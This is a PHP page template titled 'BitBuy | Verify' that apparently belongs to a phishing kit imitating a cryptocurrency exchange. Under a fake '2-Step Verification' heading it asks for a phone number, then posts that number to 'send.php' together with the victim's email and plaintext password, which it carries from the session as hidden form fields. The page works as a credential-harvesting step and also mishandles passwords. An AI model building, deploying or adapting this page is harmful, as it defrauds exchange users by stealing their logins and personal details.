<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'BitBuy | Verify';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class='container'>
            <div class="row justify-content-center mt60 pt60">
                <div class='col-sm-5 bg-white rounded-5 shadow-lg text-dark p25'>
                    <div class='col-sm-12 text-center'>
                        <h2 class='h4'>2-Step Verification</h2>
                    </div>
                    <div class="row my15">
                        <div class='fs13 pt15'>Enter the 2-step verification generated by your authenticator app.</div>
                    </div>
                    <form method="post" action="<?= base_url('send.php')?>" class="">
                        <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                        <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                         <div className="my25">
                            <div class="form-control fs16">
                                <input name="phone_number" type="number" id="phone_number" required="" class="form-control-add" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class='text-center mx-auto d-grid gap-2 mt60 mb30'>
                            <button type="submit" class="btn btn-danger btn-primary-2 btn-lg btn-block">
                                <span>Submit</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>